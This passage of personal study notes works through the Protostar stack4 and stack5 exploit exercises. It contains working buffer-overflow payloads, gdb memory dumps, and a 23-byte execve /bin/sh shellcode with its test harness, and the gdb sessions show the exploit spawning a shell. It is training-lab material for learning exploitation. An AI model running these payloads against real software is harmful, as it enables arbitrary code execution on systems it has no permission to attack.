<span class="w"> </span><span class="n">Locals</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0xbffffd78</span><span class="p">,</span><span class="w"> </span><span class="n">Previous</span><span class="w"> </span><span class="n">frame</span><span class="s1">&#39;s sp is 0xbffffd80</span>
<span class="s1"> Saved registers:</span>
<span class="s1">  ebp at 0xbffffd78, eip at 0xbffffd7c</span>
<span class="s1">(gdb) x/32x $esp</span>
<span class="s1">0xbffffd20:     0xbffffd30      0xb7ec6165      0xbffffd38      0xb7eada75</span>
<span class="s1">0xbffffd30:     0x41414141      0x42424242      0xbffffd00      0x080482e8</span>
<span class="s1">0xbffffd40:     0xb7ff1040      0x080495ec      0xbffffd78      0x08048449</span>
<span class="s1">0xbffffd50:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffffd78</span>
<span class="s1">0xbffffd60:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4</span>
<span class="s1">0xbffffd70:     0x08048430      0x00000000      0xbffffdf8      0xb7eadc76</span>
<span class="s1">0xbffffd80:     0x00000001      0xbffffe24      0xbffffe2c      0xb7fe1848</span>
<span class="s1">0xbffffd90:     0xbffffde0      0xffffffff      0xb7ffeff4      0x0804824b</span>

<span class="s1">user@protostar:/opt/protostar/bin$ python -c &#39;</span><span class="k">print</span><span class="p">(</span><span class="ss">&quot;A&quot;</span><span class="o">*</span><span class="mi">19</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="ss">&quot;\xf4\x83\x04\x08&quot;</span><span class="p">)</span><span class="err">&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">stack4</span><span class="w"></span>
<span class="n">code</span><span class="w"> </span><span class="n">flow</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">changed</span><span class="w"></span>
<span class="n">Segmentation</span><span class="w"> </span><span class="n">fault</span><span class="w"></span>
</code></pre></div>
</td></tr></table>

<p>Notes:
* find out adress of function win
* find out adress of saved <strong>Stack Pointer</strong>
* Offset: 19 Blocks each 4 Bytes
* overwrite <strong>Return Pointer</strong></p>
<h2 id="stack5">stack5<a class="headerlink" href="#stack5" title="Permanent link">&para;</a></h2>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>

<blockquote>
<p>Stack5 is a standard buffer overflow, this time introducing shellcode.
This level is at /opt/protostar/bin/stack5
Hints:
* At this point in time, it might be easier to use someone elses shellcode
* If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
* remove the int3s once your shellcode is done.</p>
</blockquote>
<p>Shellcode</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>    <span class="err">*****************************************************</span>
    <span class="err">*</span>    <span class="nf">Linux</span><span class="err">/</span><span class="no">x86</span> <span class="no">execve</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span> <span class="no">shellcode</span> <span class="mi">23</span> <span class="no">bytes</span>    <span class="p">*</span>
    <span class="err">*****************************************************</span>
    <span class="err">*</span>         <span class="nl">Author:</span> <span class="nf">Hamza</span> <span class="no">Megahed</span>             <span class="p">*</span>
    <span class="err">*****************************************************</span>
    <span class="err">*</span>             <span class="nl">Twitter:</span> <span class="err">@</span><span class="nf">Hamza_Mega</span>                  <span class="p">*</span>
    <span class="err">*****************************************************</span>
    <span class="err">*</span>     <span class="nl">blog:</span> <span class="nf">hamza-mega</span><span class="p">[</span><span class="no">dot</span><span class="p">]</span><span class="no">blogspot</span><span class="p">[</span><span class="no">dot</span><span class="p">]</span><span class="no">com</span>         <span class="p">*</span>
    <span class="err">*****************************************************</span>
    <span class="err">*</span>   <span class="nl">E-mail:</span> <span class="nf">hamza</span><span class="p">[</span><span class="no">dot</span><span class="p">]</span><span class="no">megahed</span><span class="p">[</span><span class="no">at</span><span class="p">]</span><span class="no">gmail</span><span class="p">[</span><span class="no">dot</span><span class="p">]</span><span class="no">com</span>      <span class="p">*</span>
    <span class="err">*****************************************************</span>

<span class="nf">xor</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%eax</span>
<span class="nf">push</span>   <span class="nv">%eax</span>
<span class="nf">push</span>   <span class="no">$0x68732f2f</span>
<span class="nf">push</span>   <span class="no">$0x6e69622f</span>
<span class="nf">mov</span>    <span class="nv">%esp</span><span class="p">,</span><span class="nv">%ebx</span>
<span class="nf">push</span>   <span class="nv">%eax</span>
<span class="nf">push</span>   <span class="nv">%ebx</span>
<span class="nf">mov</span>    <span class="nv">%esp</span><span class="p">,</span><span class="nv">%ecx</span>
<span class="nf">mov</span>    <span class="no">$0xb</span><span class="p">,</span><span class="nv">%al</span>
<span class="nf">int</span>    <span class="no">$0x80</span>

<span class="err">********************************</span>
<span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;string.h&gt;</span>

<span class="nf">char</span> <span class="p">*</span><span class="no">shellcode</span> <span class="err">=</span> <span class="err">&quot;\</span><span class="no">x31</span><span class="err">\</span><span class="no">xc0</span><span class="err">\</span><span class="no">x50</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x62</span><span class="err">\</span><span class="no">x69</span><span class="err">&quot;</span>
          <span class="err">&quot;\</span><span class="nf">x6e</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe3</span><span class="err">\</span><span class="no">x50</span><span class="err">\</span><span class="no">x53</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe1</span><span class="err">\</span><span class="no">xb0</span><span class="err">\</span><span class="no">x0b</span><span class="err">\</span><span class="no">xcd</span><span class="err">\</span><span class="no">x80</span><span class="err">&quot;</span><span class="c1">;</span>

<span class="nf">int</span> <span class="no">main</span><span class="p">(</span><span class="no">void</span><span class="p">)</span>
<span class="err">{</span>
<span class="nf">fprintf</span><span class="p">(</span><span class="no">stdout</span><span class="p">,</span><span class="err">&quot;</span><span class="no">Length</span><span class="p">:</span> <span class="nv">%d</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span><span class="no">strlen</span><span class="p">(</span><span class="no">shellcode</span><span class="p">))</span><span class="c1">;</span>
<span class="err">(*(</span><span class="nf">void</span><span class="p">(*)())</span> <span class="no">shellcode</span><span class="p">)()</span><span class="c1">;</span>
<span class="nf">return</span> <span class="mi">0</span><span class="c1">;</span>
<span class="err">}</span>

<span class="nl">Payload:</span>
<span class="err">\</span><span class="nf">x31</span><span class="err">\</span><span class="no">xc0</span><span class="err">\</span><span class="no">x50</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x62</span><span class="err">\</span><span class="no">x69</span><span class="err">\</span><span class="no">x6e</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe3</span><span class="err">\</span><span class="no">x50</span><span class="err">\</span><span class="no">x53</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe1</span><span class="err">\</span><span class="no">xb0</span><span class="err">\</span><span class="no">x0b</span><span class="err">\</span><span class="no">xcd</span><span class="err">\</span><span class="no">x80</span>
</code></pre></div>
</td></tr></table>

<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">.</span><span class="o">/</span><span class="n">vuln</span> <span class="err">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="k">c</span> <span class="s1">&#39;print &quot;\x90&quot;*40 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*47 + &quot;\x20\xce\xff\xff&quot;&#39;</span><span class="p">)</span>

<span class="p">.</span><span class="o">/</span><span class="n">vuln</span> <span class="err">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="k">c</span> <span class="s1">&#39;print &quot;\x90&quot;*40 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*47 + &quot;\x20\xce\xff\xff&quot;&#39;</span><span class="p">)</span>

 <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">shell</span> <span class="n">python</span> <span class="o">-</span><span class="k">c</span> <span class="s1">&#39;print &quot;\x90&quot;*40 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*3 +&quot;B&quot;*4*2 + &quot;\x20\xce\xff\xff&quot;&#39;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="k">input</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>

<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">shell</span> <span class="n">python</span> <span class="o">-</span><span class="k">c</span> <span class="s1">&#39;print &quot;\x90&quot;*32 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*3 +&quot;B&quot;*4*4 + &quot;\x90\xf7\xff\xbf&quot;&#39;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="k">input</span>
</code></pre></div>
</td></tr></table>

<p>Notes:
* <a href="https://dhavalkapil.com/blogs/Shellcode-Injection/">Shellcode Explanation</a>
* <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">Shellcode</a>
* \x90 stands for <code>nops</code> in hex</p>
<h2 id="scratch-notes">Scratch Notes<a class="headerlink" href="#scratch-notes" title="Permanent link">&para;</a></h2>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="n">user</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import struct; p = struct.pack(&quot;&gt;I&quot;, 0x12345678); print(&quot;</span><span class="se">\x42</span><span class="s1">&quot;*4 + p)&#39;</span> <span class="o">|</span> <span class="n">hexdump</span> <span class="o">-</span><span class="n">C</span>
<span class="mo">00000000</span>  <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">12</span> <span class="mi">34</span> <span class="mi">56</span> <span class="mi">78</span>  <span class="mi">0</span><span class="n">a</span>                       <span class="o">|</span><span class="n">BBBB</span><span class="o">.</span><span class="mi">4</span><span class="n">Vx</span><span class="o">.|</span>
<span class="mo">0000000</span><span class="mi">9</span>
<span class="n">user</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import struct; p = struct.pack(&quot;&gt;I&quot;, 0x12345678); print(&quot;</span><span class="se">\xCC</span><span class="s1">&quot;*4 + p)&#39;</span> <span class="o">|</span> <span class="n">hexdump</span> <span class="o">-</span><span class="n">C</span>
<span class="mo">00000000</span>  <span class="n">cc</span> <span class="n">cc</span> <span class="n">cc</span> <span class="n">cc</span> <span class="mi">12</span> <span class="mi">34</span> <span class="mi">56</span> <span class="mi">78</span>  <span class="mi">0</span><span class="n">a</span>                       <span class="o">|.....</span><span class="mi">4</span><span class="n">Vx</span><span class="o">.|</span>
<span class="mo">0000000</span><span class="mi">9</span>
<span class="n">user</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import struct; p = struct.pack(&quot;I&quot;, 0x12345678); print(&quot;</span><span class="se">\xCC</span><span class="s1">&quot;*4 + p)&#39;</span> <span class="o">|</span> <span class="n">hexdump</span> <span class="o">-</span><span class="n">C</span>
<span class="mo">00000000</span>  <span class="n">cc</span> <span class="n">cc</span> <span class="n">cc</span> <span class="n">cc</span> <span class="mi">78</span> <span class="mi">56</span> <span class="mi">34</span> <span class="mi">12</span>  <span class="mi">0</span><span class="n">a</span>                       <span class="o">|....</span><span class="n">xV4</span><span class="o">..|</span>
<span class="mo">0000000</span><span class="mi">9</span>
<span class="n">user</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import struct; p = struct.pack(&quot;&lt;I&quot;, 0x12345678); print(&quot;</span><span class="se">\xCC</span><span class="s1">&quot;*4 + p)&#39;</span> <span class="o">|</span> <span class="n">hexdump</span> <span class="o">-</span><span class="n">C</span>
<span class="mo">00000000</span>  <span class="n">cc</span> <span class="n">cc</span> <span class="n">cc</span> <span class="n">cc</span> <span class="mi">78</span> <span class="mi">56</span> <span class="mi">34</span> <span class="mi">12</span>  <span class="mi">0</span><span class="n">a</span>                       <span class="o">|....</span><span class="n">xV4</span><span class="o">..|</span>
<span class="mo">0000000</span><span class="mi">9</span>
<span class="n">user</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import struct; p = struct.pack(&quot;I&quot;, 0x12345678); print(&quot;</span><span class="se">\xCC</span><span class="s1">&quot;*4 + p)&#39;</span> <span class="o">|</span> <span class="n">hexdump</span> <span class="o">-</span><span class="n">C</span>
<span class="mo">00000000</span>  <span class="n">cc</span> <span class="n">cc</span> <span class="n">cc</span> <span class="n">cc</span> <span class="mi">78</span> <span class="mi">56</span> <span class="mi">34</span> <span class="mi">12</span>  <span class="mi">0</span><span class="n">a</span>                       <span class="o">|....</span><span class="n">xV4</span><span class="o">..|</span>
<span class="mo">0000000</span><span class="mi">9</span>
</code></pre></div>
</td></tr></table>

<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="n">gets</span><span class="w"> </span><span class="n">argument</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">runtime</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">gdb</span><span class="w"></span>
<span class="k">user</span><span class="nv">@protostar</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;print(&quot;A&quot;*64+&quot;BB&quot;)&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="k">input</span><span class="w"></span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="k">input</span><span class="p">)</span><span class="w"></span>

<span class="err">#</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="n">basic</span><span class="w"> </span><span class="k">usage</span><span class="w"></span>
<span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">intel</span><span class="w"> </span><span class="o">&lt;</span><span class="nc">binary</span><span class="o">&gt;</span><span class="w"></span>
</code></pre></div>
</td></tr></table>

<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> shell python -c <span class="s2">&quot;import struct; print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39; + &#39;A&#39; + &#39;B&#39;*4*13  + struct.pack(&#39;I&#39;, 0xbffff770) &quot;</span> &gt; /home/user/input
<span class="o">(</span>gdb<span class="o">)</span> run
The program being debugged has been started already.
Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
Starting program: /opt/protostar/bin/stack5 &lt; /home/user/input

Breakpoint <span class="m">1</span>, 0x080483d4 in main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff864<span class="o">)</span> at stack5/stack5.c:10
<span class="m">10</span>      in stack5/stack5.c
<span class="o">(</span>gdb<span class="o">)</span> x/32x <span class="nv">$esp</span>
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0xb7fd7ff4      0x0804958c      0xbffff788      0x080482c4
0xbffff780:     0xb7ff1040      0x0804958c      0xbffff7b8      0x08048409
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x080483f0      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x080483fb      0xb7fd7ff4
0xbffff7b0:     0x080483f0      0x00000000      0xbffff838      0xb7eadc76
0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.

Breakpoint <span class="m">2</span>, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">0</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff864<span class="o">)</span> at stack5/stack5.c:11
<span class="m">11</span>      in stack5/stack5.c
<span class="o">(</span>gdb<span class="o">)</span> x/32x <span class="nv">$esp</span>
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0x6850c031      0x68732f2f      0x69622f68      0x50e3896e
0xbffff780:     0xb0e18953      0x4180cd0b      0x42424242      0x42424242
0xbffff790:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff7a0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff7b0:     0x42424242      0x42424242      0x42424242      0xbffff770
0xbffff7c0:     0x00000000      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.
Executing new program: /bin/dash
Error in re-setting breakpoint <span class="m">1</span>: No symbol table is loaded.  Use the <span class="s2">&quot;file&quot;</span> command.
Error in re-setting breakpoint <span class="m">2</span>: No symbol table is loaded.  Use the <span class="s2">&quot;file&quot;</span> command.
Error in re-setting breakpoint <span class="m">1</span>: No symbol <span class="s2">&quot;main&quot;</span> in current context.
Error in re-setting breakpoint <span class="m">2</span>: No symbol <span class="s2">&quot;main&quot;</span> in current context.
Error in re-setting breakpoint <span class="m">1</span>: No symbol <span class="s2">&quot;main&quot;</span> in current context.
Error in re-setting breakpoint <span class="m">2</span>: No symbol <span class="s2">&quot;main&quot;</span> in current context.

Program exited normally.
<span class="o">(</span>gdb<span class="o">)</span>
</code></pre></div>
</td></tr></table>

<h2 id="python-foo">Python Foo<a class="headerlink" href="#python-foo" title="Permanent link">&para;</a></h2>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">$</span> <span class="n">python</span>
<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">struct</span>
<span class="o">&gt;&gt;&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="mh">0x41424344</span><span class="p">)</span> <span class="c1"># big endian Integer &gt;I</span>
<span class="n">ABCD</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x41424344</span><span class="p">)</span> <span class="c1"># little endian Integer &lt;I</span>
<span class="n">DCBA</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="s2">&quot;ABCD&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="c1"># &quot;\x41\x42\x43\x44&quot; as big endian number</span>
<span class="mh">0x41424344</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="s2">&quot;ABCD&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="c1"># interpret as little endian number</span>
<span class="mh">0x44434241</span>
</code></pre></div>
</td></tr></table>
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
        
          <a href="../hacking/" title="Hacking the art of exploitation" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
            </div>
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Hacking the art of exploitation
              </div>
            </div>
          </a>
        
        
          <a href="../oscp/" title="OSCP" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                OSCP
              </div>
            </div>
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; Felix KÃ¶rner under CC BY-SA 3.0 DE
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/vendor.d710d30a.min.js"></script>
      <script src="../assets/javascripts/bundle.4a5ba8d6.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents"}</script>
      
      <script>
        app = initialize({
          base: "..",
          features: [],
          search: Object.assign({
            worker: "../assets/javascripts/worker/search.9b3611bd.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
    
  </body>
</html>